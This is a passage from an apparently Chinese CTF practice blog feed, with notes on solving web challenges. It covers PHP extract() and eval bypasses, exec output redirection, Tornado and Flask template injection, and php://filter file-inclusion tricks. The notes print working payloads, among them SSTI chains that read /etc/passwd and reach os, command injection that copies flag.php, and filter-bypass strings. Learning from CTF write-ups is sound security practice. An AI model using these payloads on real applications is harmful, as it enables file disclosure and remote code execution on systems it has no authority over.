&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;_&lt;/mi&gt;&lt;mi&gt;P&lt;/mi&gt;&lt;mi&gt;O&lt;/mi&gt;&lt;mi&gt;S&lt;/mi&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;[&lt;/mo&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;mo stretchy=&#34;false&#34;&gt;]&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mn&gt;36&lt;/mn&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mtext&gt;再通过&lt;/mtext&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;\_POST[key2]=36d
  再通过extract(&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.06em;vertical-align:-0.31em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34; style=&#34;margin-right:0.02778em;&#34;&gt;_&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.13889em;&#34;&gt;POST&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;ey&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;36&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;再通过&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;_POST) 转化为&lt;br&gt;
 $key1=36d     $key2=36d&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;mark&gt;绕过了很多打印符&lt;/mark&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!&lt;span class=&#34;title function_ invoke__&#34;&gt;preg_match&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&amp;#123;|\&amp;#125;|\&amp;quot;|\&amp;#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&amp;quot;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$c&lt;/span&gt;)&amp;amp;&amp;amp;&lt;span class=&#34;variable&#34;&gt;$c&lt;/span&gt;&amp;lt;=&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;blockquote&gt;
&lt;p&gt;GET:?1=php://filter/convert.base64-encode/resource=flag.php&lt;br&gt;
POST:fun=include$_GET[1]&lt;/p&gt;
&lt;p&gt;GET:?1=flag.php&lt;br&gt;
POST:&amp;amp;fun=highlight_file($_GET[1])&lt;/p&gt;
&lt;p&gt;fun=var_export(get_defined_vars())&lt;/p&gt;
&lt;p&gt;fun=highlight_file($_POST[1])&amp;amp;1=flag.php&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;eval命令执行&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#eval命令执行&#34;&gt;#&lt;/a&gt; eval () 命令执行&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202411070834300.png&#34; alt=&#34;image-20241107083421148&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;分析&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;eval 只执行前 6 个字符。传入 ==F=\`F`;+sleep 3== 就能执行整个内容&lt;/p&gt;
&lt;h3 id=&#34;解题姿势&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#解题姿势&#34;&gt;#&lt;/a&gt; 解题姿势&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;使用 dnslog&lt;br&gt;
dnslog 前缀太多就不会有显示，ctfshow 上一直不成功，所以需要筛选一下&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;没有限制写文件&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;`F\` ;nl flag.php&gt;1.txt
\`F` ;cp flag.php&amp;gt;1.txt 或 cp+flag.php+1.txt&lt;br&gt;
`$F` ;mv flag.php&amp;gt;1.txt&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;exec&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#exec&#34;&gt;#&lt;/a&gt; exec()&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;不会输出结果到标准输出&lt;/strong&gt;，而是将最后一行结果作为返回值返回；&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;将重定向到某个文件（&amp;gt;    tee)   &lt;code&gt;tee命令会覆盖指定文件&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;ls / | tee 1&lt;/p&gt;
&lt;p&gt;ls /flag | tee 2&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;小知识&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#小知识&#34;&gt;#&lt;/a&gt; 小知识&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;windows 系统中，url 目录有多条斜杠不影响&lt;/li&gt;
&lt;li&gt;关注运算符&lt;mark&gt;优先级&lt;/mark&gt;！（&amp;amp;&amp;amp; 优先级高于 ||，“=” 赋值的优先级高于 and）&lt;/li&gt;
&lt;/ol&gt;
</content>
        <updated>2024-11-06T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>https://starofeden.github.io/2023/04/15/xctf%E5%88%B7%E9%A2%98/</id>
        <title>xctf刷题</title>
        <link rel="alternate" href="https://starofeden.github.io/2023/04/15/xctf%E5%88%B7%E9%A2%98/"/>
        <content type="html">&lt;h1 id=&#34;模板注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#模板注入&#34;&gt;#&lt;/a&gt; &lt;strong&gt;模板注入&lt;/strong&gt;&lt;/h1&gt;
&lt;h2 id=&#34;tornado-框架&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#tornado-框架&#34;&gt;#&lt;/a&gt; Tornado 框架&lt;/h2&gt;
&lt;h3 id=&#34;知识点&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#知识点&#34;&gt;#&lt;/a&gt; 知识点：&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;render 函数：通过传递不同的参数形成不同的改变&lt;/li&gt;
&lt;li&gt;tornado render 模板注入漏洞：&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过&amp;#123;&amp;#123;&amp;#125;&amp;#125;进行传递变量和执行简单的表达式。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;得到cookie_secret的值&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#得到cookie_secret的值&#34;&gt;#&lt;/a&gt; 得到 cookie_secret 的值：&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;error?msg=&amp;#123;&amp;#123;handler.settings&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;em&gt;handler.settings 是 tornado 框架的一个附属文件&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&#34;flassk模板注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#flassk模板注入&#34;&gt;#&lt;/a&gt; flassk 模板注入&lt;/h2&gt;
&lt;h3 id=&#34;思路&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#思路&#34;&gt;#&lt;/a&gt; 思路：&lt;/h3&gt;
&lt;p&gt;找到父类 &amp;lt;type ‘object’&amp;gt;–&amp;gt; 寻找子类–&amp;gt; 找关于命令执行或者文件操作的模块。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;几个魔术方法：&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__class__  返回类型所属的对象&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__base__   返回该对象所继承的基类&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// __base__和__mro__都是用来寻找基类的&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__init__  类的初始化方法&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__globals__  对包含函数全局变量的字典的引用&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;## &amp;#123;&amp;#123;&amp;#125;&amp;#125;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;* 传递变量&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;* 执行一些简单表达式&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;hr&gt;
&lt;ul&gt;
&lt;li&gt;
：查看全局变量
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;步骤&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#步骤&#34;&gt;#&lt;/a&gt; 步骤：&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;寻找可用引用&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123;&amp;#x27;&amp;#x27;.__class__.__mro__[2].__subclasses__()&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;文件读取， &lt;code&gt;[40]&lt;/code&gt;  是 tupe file 类型出现位置（从 0 开始的位置）&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123; [].__class__.__base__.__subclasses__()[40](&amp;#x27;/etc/passwd&amp;#x27;).read() &amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;命令执行 (有一个 &amp;lt;class ‘site._Printer’&amp;gt; 类型)&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123;&amp;#x27;&amp;#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&amp;#x27;os&amp;#x27;].listdir(&amp;#x27;.&amp;#x27;)&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;[71]&lt;/code&gt;  为 &amp;lt;class ‘site._Printer’&amp;gt; 出现位置&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;2文件include&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2文件include&#34;&gt;#&lt;/a&gt; 2. 文件 include&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;5.10 更新：好久没刷题了，做个 md 复习一下&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;file_include过滤&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#file_include过滤&#34;&gt;#&lt;/a&gt; file_include (过滤)&lt;/h3&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;highlight_file&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;./check.php&amp;quot;&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;filename&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt;  = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;filename&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;尝试用 php://filter:&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;?filename=php://filter/read=convert.base64-encode/reasource=check.php&lt;br&gt;
 回显 &amp;quot;do not hack!&amp;quot;&lt;br&gt;
 那应该是过滤&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;使用过滤器 convert.* (string.* 被过滤)&lt;/li&gt;
&lt;li&gt;构造 URL：&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;?filename=php://filter/convert.iconv.a.b/resource=flag.php&lt;br&gt;
 &lt;code&gt;flag可能在flag.php&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;使用 bp 对 a,b 进行爆破 (集束炸弹)，字典如下：&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;UCS-4*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UCS-4BE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UCS-4LE*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UCS-2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UCS-2BE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UCS-2LE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UTF-32*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UTF-32BE*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UTF-32LE*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UTF-16*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UTF-16BE*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UTF-16LE*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UTF-7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UTF7-IMAP&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;UTF-8*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ASCII*&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;web_php_include&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#web_php_include&#34;&gt;#&lt;/a&gt; web_php_include&lt;/h2&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;show_source&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;hello&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$page&lt;/span&gt;=&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;page&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; (&lt;span class=&#34;title function_ invoke__&#34;&gt;strstr&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$page&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;php://&amp;quot;&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$page&lt;/span&gt;=&lt;span class=&#34;title function_ invoke__&#34;&gt;str_replace&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;php://&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$page&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//过滤了php://&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$page&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;知识点-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#知识点-2&#34;&gt;#&lt;/a&gt; 知识点&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;由题可知过滤了 php://, 考虑使用其它伪协议&lt;/li&gt;
&lt;li&gt;伪协议包括：&lt;br&gt;
&lt;strong&gt;file 协议&lt;/strong&gt;：&lt;br&gt;
allow_url_fopen ：off/on&lt;br&gt;
allow_url_include：off/on&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;file://  &lt;code&gt;用于访问本地文件系统&lt;/code&gt; ，在 CTF 中通常用来读取本地文件的且不受 allow_url_fopen 与 allow_url_include 的影响。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;php:// 协议&lt;/strong&gt;:&lt;br&gt;
 仅 php://input、 php://stdin、 php://memory 和 php://temp 需要开启 allow_url_include。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;data:// 协议&lt;/strong&gt;：满足双 off 条件&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;strstr&lt;/strong&gt; 函数：&lt;br&gt;
函数用于判断字符串 str2 是否是 str1 的子串。如果是，则该函数返回 str1 字符串从 str2 第一次出现的位置开始到 str1 结尾的字符串；否则，返回 NULL。&lt;/li&gt;
&lt;li&gt;**str_replace ()** 函数：&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
